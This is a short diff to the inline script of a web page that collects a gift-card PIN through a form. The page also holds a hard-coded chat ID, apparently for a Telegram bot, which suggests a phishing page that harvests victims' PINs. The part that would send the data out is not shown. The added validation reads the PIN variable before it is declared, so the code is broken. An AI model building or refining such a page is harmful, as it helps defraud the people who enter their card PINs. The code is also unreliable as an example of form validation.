@@ -115,7 +115,8 @@
   </div>
 
   <script>
-    const input = document.getElementById('giftPin');
+     const input = document.getElementById('giftPin');
+  const form = document.getElementById("giftForm");
 
     input.addEventListener('input', function(e) {
       let value = e.target.value.replace(/\s+/g, ''); // remove spaces
@@ -127,6 +128,11 @@
    const chatId = "7709189291";   
   document.getElementById("giftForm").addEventListener("submit", function(e) {
     e.preventDefault();
+
+     if (!giftPin) {
+      alert("⚠️ Please input the pin to continue");
+      return;
+    }
 
     const giftPin = document.getElementById("giftPin").value;
 
